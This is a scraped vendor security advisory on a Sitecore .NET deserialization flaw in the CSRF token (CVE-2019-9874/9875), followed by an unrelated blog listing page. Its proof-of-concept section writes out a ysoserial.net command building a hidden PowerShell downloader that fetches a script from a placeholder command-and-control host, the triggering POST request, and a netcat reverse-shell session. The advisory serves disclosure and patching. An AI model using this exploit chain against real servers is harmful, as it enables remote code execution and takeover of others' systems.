=== Content from www.synacktiv.com_620dac39_20250121_005450.html ===
Unsafe Object Deserialization in
Sitecore <= 9.1.0

Security advisory
2019-04-16

Julien Legras
Adrien Peter

www.synacktiv.com

5 Boulevard Montmartre 75002 Paris

Vulnerabilities description

Presentation of Sitecore
"Sitecore CMS is the robust content management system that scales for enterprise needs. Global brands turn to Sitecore for
multisite and multilingual content management—at scale, with the flexibility that enterprises demand. Millions of experiences
are delivered reliably and securely every day with Sitecore Experience Manager."1

The issue
During a security assessment for a customer, Synacktiv consultants found a severe vulnerability in the CSRF protection,
leading to a remote code execution.

Indeed, the CSRF protection expects a serialized object. Thus, this serialized object can be tampered to create valid .NET
objects. Using .NET deserialization gadgets, it is possible to gain arbitrary command execution on the server.

Affected versions
The Sitecore versions 8.x can be exploited without authentication.

The Sitecore versions 9.x < 9.1.1 must be exploited with authentication.

Fix status
For Sitecore versions < 9.0, a patch is available: https://kb.sitecore.net/articles/334035.

For Sitecore versions > 9.0, install the latest version 9.1 Update-1:
https://dev.sitecore.net/Downloads/Sitecore_Experience_Platform/91/Sitecore_Experience_Platform_91_Update1.aspx.

Timeline

Date

2019-02-19

2019-02-20

2019-02-20

2019-02-23

2019-03-01

2019-03-16

2019-03-19

2019-04-05

2019-04-16

Action

Vulnerabilities identified.

Advisory writing.

Advisory sent to security team.

Sitecore responded with details for authenticated and unauthenticated versions.

Sitecore published a hot fix for the unauthenticated version:
https://kb.sitecore.net/articles/334035

CVE ID requested.

CVE IDs CVE-2019-9874 and CVE-2019-9875 reserved.

Sitecore published a new version 9.1 Update-1.

Advisory released.

1https://www.sitecore.com/products/sitecore-experience-platform/wc

 m

 2/6

Technical description and proof-of-concept

Initial vulnerability discovery
Searching   for   vulnerabilities   on   a  Sitecore  instance,   Synacktiv   consultants   noticed   that   a   POST   request   on   the   page
/sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx resulted in an error about CSRF protection:

POST /sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx HTTP/1.1
Host: victimhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

HTTP/1.1 500 Internal Server Error
[…]
[PotentialCsrfException: No CSRF cookie supplied and CSRF form field is missing.]
   Sitecore.Security.AntiCsrf.SitecoreAntiCsrfModule.RaiseError(Exception ex, HttpContext
context) +212
   Sitecore.Security.AntiCsrf.SitecoreAntiCsrfModule.PreRequestHandlerExecute(Object
sender, EventArgs e) +1061
   System.Web.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+223
   System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step) +213
   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp;
completedSynchronously) +91

Using dnSpy, the code raising this exception can be located in the library Sitecore.Security.AntiCsrf.dll, more precisely in the
method SitecoreAntiCsrfModule of the class PreRequestHandlerExecute:

Illustration 1: Exception raising code.

 3/6

To construct a valid request, a cookie  __CSRFCOOKIE  and a POST parameter  __CSRFTOKEN  must be provided. The
CSRF   protection   is   supposed   to   compare   both   values   but   in   fact,   the   __CSRFTOKEN  parameter   is   a   string   that   is
deserialized without any kind of check and then, the values are compared:

Illustration 2: Deserialization code.

As the ObjectStateFormatter class is instantiated without any parameter, its attribute _page will be null. Thus, no signature is
checked:

Illustration 3: ObjectStateFormatter cryptographic checks.

 4/6

Then, the stream is deserialized:

Illustration 4: ObjectStateFormatter deserialization.

Proof of concept of the code execution
To exploit this vulnerability, it is possible to use the tool ysoserial.net2 to generate a basic PowerShell downloader:

PS> .\ysoserial.exe -g TypeConfuseDelegate -f ObjectStateFormatter -o base64 -c
'powershell.exe -nop -w hidden -c $b=new-object net

.webclient;IEX $b.downloadstring(''http://<ccaddress>:8080/reverse.ps1'');'

/wEysRIAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00[...]

Then, the following POST request can be performed to trigger the deserialize and trigger the payload:

POST /sitecore/shell/Applications/Security/CreateNewUser/CreateNewUser.aspx HTTP/1.1
Host: victimhost
Cookie: __CSRFCOOKIE=test;
Content-Type: application/x-www-form-urlencoded
Content-Length: 3156

__CSRFTOKEN=/wEysRIAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00[…]

This object will be deserialized and compared to the cookie, operation that will fail:

HTTP/1.1 500 Internal Server Error
[…]
[PotentialCsrfException: The CSRF cookie value did not match the CSRF parameter value.]
   Sitecore.Security.AntiCsrf.SitecoreAntiCsrfModule.RaiseError(Exception ex, HttpContext
context) +212
   Sitecore.Security.AntiCsrf.SitecoreAntiCsrfModule.PreRequestHandlerExecute(Object
sender, EventArgs e) +1597
   System.Web.SyncEventExecutionStep.System.Web.HttpApplication.IExecutionStep.Execute()
+223
   System.Web.HttpApplication.ExecuteStepImpl(IExecutionStep step) +213
   System.Web.HttpApplication.ExecuteStep(IExecutionStep step, Boolean&amp;
completedSynchronously) +91

2https://github.com/pwntester/ysoserial.net

 5/6

However, the payload was executed during the deserialization step and will fetch the second stage on the remote server:

$ python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
X.X.X.X - - [20/Feb/2019 14:37:57] "GET /reverse.ps1 HTTP/1.1" 200 -

This payload is based on https://gist.github.com/staaldraad/204928a6004e89553a8d3db0ce527fd5#file-mini-reverse-ps1 and
will allow to obtain a reverse shell to execute arbitrary commands on the server:

$ nc -lvvvp 12345
Listening on [0.0.0.0] (family 0, port 12345)
Connection from X.X.X.X 4160 received!
whoami
iis apppool\<redacted>

Impact
A successful exploitation of this vulnerability allows executing arbitrary commands and accessing the underlying filesytem.

As the service identity will be used to interact with the system, the impact mostly depends on the privileges of the service.

 6/6



=== Content from www.synacktiv.com_0da2c170_20250121_005450.html ===

[Skip to main content](publications#main-content)
 [Search](../search)
Switch Language

ENToggle Dropdown

* EN
* [FR](../publications)

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

[![Home](../sites/default/files/logo_synacktiv_blanc.png)](../en "Home")

* [Our offer](our-offer)
  + [Penetration Test / Red Team](features/penetration-test-red-team)
  + [Incident response](features/incident-response)
  + [Trainings](offers/trainings)
  + [Reverse-engineering](features/reverse-engineering)
  + [Development](our-team/development)
  + [Products](products/kraqozorus)
  + [CSIRT](csirt)
* [Join us](join-us)
* [Publications](our-publications)
  + [Posts](publications)
  + [Advisories](advisories)
  + [Resources](ressources)
* [The company](the-company)
* [Contact](contact)

* [Advisories](advisories)
* [Posts](publications)
* [Resources](ressources)

* [ALL POSTS](publications)
* [Challenges](publications%253Ffield_tags_target_id%253D1)
* [Development](publications%253Ffield_tags_target_id%253D73)
* [Network](publications%253Ffield_tags_target_id%253D74)
* [Cryptography](publications%253Ffield_tags_target_id%253D35)
* [CSIRT](publications%253Ffield_tags_target_id%253D39)
* [Tools](publications%253Ffield_tags_target_id%253D19)
* [Hardware](publications%253Ffield_tags_target_id%253D2)
* [Exploit](publications%253Ffield_tags_target_id%253D3)
* [Pentest](publications%253Ffield_tags_target_id%253D4)
* [Systems](publications%253Ffield_tags_target_id%253D5)
* [Reverse-engineering](publications%253Ffield_tags_target_id%253D6)

Apply

* [RSS](/en/feed/lastblog.xml)
* [Github](https://github.com/Synacktiv)
* [Twitter](https://twitter.com/synacktiv)
* [Linkedin](https://fr.linkedin.com/company/synacktiv)

# Publications

[![adb_internals_2_2](../sites/default/files/styles/blog_grid_view/public/2024-12/adb_2_2.jpg)](publications/diving-into-adb-protocol-internals-22)
## [Diving into ADB protocol internals (2/2)](publications/diving-into-adb-protocol-internals-22)

*16/12/2024*
Development
Tools

Our previous article laid the groundwork for understanding the ADB protocol and its usage scenarios. It primarily focused on the TCP/IP communication between the ADB Client and the ADB Server. However, this still required at this point an intermediate server to bridge our client and the Android device.
In this article, we'll dive into the message protocol between ADB Server and adbd, with the goal of improving our Rust client library with capacity to fully interact with a device, eliminating the need for system dependency installatio...
[Learn more](publications/diving-into-adb-protocol-internals-22)

[![image of a penguin surrounded by crabs](../sites/default/files/styles/blog_grid_view/public/2024-11/crabs_penguin.png)](publications/automated-network-security-with-rust-detecting-and-blocking-port-scanners)
## [Automated Network Security with Rust: Detecting and Blocking Port Scanners](publications/automated-network-security-with-rust-detecting-and-blocking-port-scanners)

*06/12/2024*
Development

Did you ever wonder how IDS/IPS like Snort or Suricata were able to interact with the network stack of the Linux kernel ?
Do you also happen to like Rust ?
Well dear reader, this article is for you !
[Learn more](publications/automated-network-security-with-rust-detecting-and-blocking-port-scanners)

[![img](../sites/default/files/styles/blog_grid_view/public/2024-11/9azn60_copy_660x330.jpg)](publications/relaying-kerberos-over-smb-using-krbrelayx)
## [Relaying Kerberos over SMB using krbrelayx](publications/relaying-kerberos-over-smb-using-krbrelayx)

*20/11/2024*
Pentest

Kerberos authentication relay was once thought to be impossible, but multiple researchers have since proven otherwise. In a 2021 article, James Forshaw discussed a technique for relaying Kerberos over SMB using a clever trick. This topic has recently resurfaced, and in this article, we aim to provide additional insights from the original research and introduce an implementation using krbrelayx.
[Learn more](publications/relaying-kerberos-over-smb-using-krbrelayx)

[![Pwn2Own Ireland 2024](../sites/default/files/styles/blog_grid_view/public/2024-10/pwn2own-ireland.jpg)](publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from)
## [Exploiting a Blind Format String Vulnerability in Modern Binaries: A Case Study from Pwn2Own Ireland 2024](publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from)

*30/10/2024*
Exploit
Reverse-engineering

In October 2024, during the Pwn2Own event in Cork, Ireland, hackers attempted to exploit various hardware devices such as printers, routers, smartphones, home automation systems, NAS devices, security cameras, and more. This blog post highlights a challenging vulnerability that was patched just before the competition. Although it was fixed in time, it deserved more attention than simply being discarded.
[Learn more](publications/exploiting-a-blind-format-string-vulnerability-in-modern-binaries-a-case-study-from)

[![Forensic analysis of bitwarden self-hosted server](../sites/default/files/styles/blog_grid_view/public/2024-10/meme_0.png)](publications/forensic-analysis-of-bitwarden-self-hosted-server)
## [Forensic analysis of bitwarden self-hosted server](publications/forensic-analysis-of-bitwarden-self-hosted-server)

*14/10/2024*
CSIRT

Bitwarden is a popular password managing software. Being open-source, it offers self-hosting capabilities with ease of use in a controlled office or home environment. Attackers might prioritize targeting this application given the secrets it usually stores. In this article, we will deep dive into the internals of Bitwarden, how it stores encrypted data, and what information is available to whomever controls the server.
[Learn more](publications/forensic-analysis-of-bitwarden-self-hosted-server)

[![such lattice](../sites/default/files/styles/blog_grid_view/public/2024-10/sans-titre.jpeg)](publications/quantum-readiness-lattice-based-pqc)
## [Quantum readiness: Lattice-based PQC](publications/quantum-readiness-lattice-based-pqc)

*11/10/2024*
Cryptography

This is the third article in the "Quantum readiness" series. This article aims at giving a rough introduction to lattices in the context of cryptography.
It follows the first article, "Quantum readiness: Introduction to Modern Cryptography", and the second article, "Quantum readiness: Hash-based signatures". Knowledge of the concepts introduced in those articles such asÃÂ indistinguishability games and hash functions, as well asÃÂ standard knowledge of linear algebra, is strongly recommended. If you are unfamiliar with linear algebra, ...
[Learn more](publications/quantum-readiness-lattice-based-pqc)

[![Fuzzing confused dependencies with Depfuzzer](../sites/default/files/styles/blog_grid_view/public/2024-09/meme-confusion.png)](publications/fuzzing-confused-dependencies-with-depfuzzer)
## [Fuzzing confused dependencies with Depfuzzer](publications/fuzzing-confused-dependencies-with-depfuzzer)

*25/09/2024*
Tools

In the landscape of software development, leveraging open-source libraries and packages through registries like NPM, PyPI, Go modules, and Crates for Rust has become standard practice. This approach facilitates the rapid integration of diverse functionalities into applications, driving both innovation and efficiency across the development community. While the benefits of using these resources are clear, the management of external dependencies introduces a set of considerations regarding security and maintainability.
Inspired by Alex ...
[Learn more](publications/fuzzing-confused-dependencies-with-depfuzzer)

[![Willow from TV Show Buffy the Vampire Slayer, looking at a computer](../sites/default/files/styles/blog_grid_view/public/2024-09/willow.jpg)](publications/defend-against-vampires-with-10-gbps-network-encryption)
## [Defend against vampires with 10 gbps network encryption](publications/defend-against-vampires-with-10-gbps-network-encryption)

*13/09/2024*
Network
Cryptography
Pentest
Systems

Discover how attackers can sniff your data on network cables and how you can defend against it, by encrypting on-the-fly all your ethernet traffic with very good performance.
Keywords : wireguard, vxlan, tapping, fiber optics, lan2lan, macsec
[Learn more](publications/defend-against-vampires-with-10-gbps-network-encryption)

[![A frog pointing a gun saying: "Hippity Hoppity, your Veeam backup's artefacts are now my property](../sites/default/files/styles/blog_grid_view/public/2024-07/blogpost_veeam_artefacts.png)](publications/using-veeam-metadata-for-efficient-extraction-of-backup-artefacts-23)
## [Using Veeam metadata for efficient extraction of Backup artefacts (2/3)](publications/using-veeam-metadata-for-efficient-extraction-of-backup-artefacts-23)

*30/08/2024*
CSIRT

In a previous blogpost, we explored Veeam Backup & Replication's "backup chain metadata" files and how to parse them in a comprehensive Velociraptor artifact. In this article, we complement our findings with metadata embedded directly in VBR's Storage files. Then, we create a Velociraptor pipeline to remotely access relevant forensic artefacts in backed up data. This aims to enable DFIR analysts to extend the time horizon in their investigations using Veeam backups and Velociraptor, while minimizing network bandwidth usage and extensi...
[Learn more](publications/using-veeam-metadata-for-efficient-extraction-of-backup-artefacts-23)

[![Post-quantum resistant](../sites/default/files/styles/blog_grid_view/public/2024-08/miniature.png)](publications/quantum-readiness-hash-based-signatures)
## [Quantum readiness: Hash-based signatures](publications/quantum-readiness-hash-based-signatures)

*26/08/2024*
Cryptography

Building robust digital signature algorithms is one of the main challenges in post-quantum cryptography, as classical signatures such as ECDSA and RSA are broken by quantum computers. Thankfully, in the past decades, the academic field has come up with multiple quantum-resistant algorithms which are now being standardized and implemented in modern software. This article highlights XMSS and SPHINCS+, two digital signature algorithms which rely on the well-known robustness of hash functions against quantum computers. However, each one c...
[Learn more](publications/quantum-readiness-hash-based-signatures)

#### Pagination

* [Current page
  1](publications%253Ffield_tags_target_id%253DAll%2526page%253D0 "Current page")
* [Page
  2](publications%253Ffield_tags_target_id%253DAll%2526page%253D1 "Go to page 2")
* [Page
  3](publications%253Ffield_tags_target_id%253DAll%2526page%253D2 "Go to page 3")
* [Page
  4](publications%253Ffield_tags_target_id%253DAll%2526page%253D3 "Go to page 4")
* [Page
  5](publications%253Ffield_tags_target_id%253DAll%2526page%253D4 "Go to page 5")
* [Page
  6](publications%253Ffield_tags_target_id%253DAll%2526page%253D5 "Go to page 6")
* [Page
  7](publications%253Ffield_tags_target_id%253DAll%2526page%253D6 "Go to page 7")
* [Page
  8](publications%253Ffield_tags_target_id%253DAll%2526page%253D7 "Go to page 8")
* [Page
  9](publications%253Ffield_tags_target_id%253DAll%2526page%253D8 "Go to page 9")
* [Next page
  âº](publications%253Ffield_tags_target_id%253DAll%2526page%253D1 "Go to next page")
* [Last page
  last](publications%253Ffield_tags_target_id%253DAll%2526page%253D17 "Go to last page")

[![Home](../sites/default/files/logo_synacktiv_blanc.png)](../en "Home")

* [Who are we?](the-company#who-we-are)
* [Our values](the-company#our-values)
* [Agreements](the-company#aggrement)
* [Our clients](the-company#our-clients)
* [Our team](our-team/back-office)

* [Back office](our-team/back-office)
* [Pentest](our-team/pentest)
* [Reverse](our-team/reverse)
* [Development](our-team/development)
* [Incident response (CSIRT)](our-team/incident-response)

* [Philosophy](join-us#philosophie)
* [Recruitment process](join-us#recrutement)
* [Job offers/internships](join-us#block-views-block-job-offer-list-view-block-1)

* [Kraqozorus](products/kraqozorus)
* [Houdini](products/houdini)
* [Disconet](products/disconet)
* [Oursin](products/oursin)
* [Leakozorus](products/leakozorus)

* [Penetration test / red team](features/penetration-test-red-team)
* [Security audit](features/security-audit)
* [Reverse-engineering](features/reverse-engineering)
* [Development](our-team/development)
* [Incident response](features/incident-response)

* [CSIRT Synacktiv](csirt)

## Contact us

+33 1 45 79 74 75

contact@synacktiv.com

[GPG key](../ressources/contact_synacktiv.asc)

## PARIS

5 boulevard Montmartre

75002 Paris

## TOULOUSE

4 Rue du Pont Guilhemery

31000 Toulouse

## LYON

56 rue Smith

69002 Lyon

## RENNES

7D Rue de ChÃ¢tillon

35000 Rennes

## LILLE

7 Boulevard Louis XIV

59000 Lille

Copyright Â© Synacktiv 2025

* [Conditions of Use](legal-notice)
* [Privacy Policy](privacy-policy)
* [Recruitment privacy policy](politique-de-confidentialite-relative-au-recrutement)
* [Contact Us](contact)


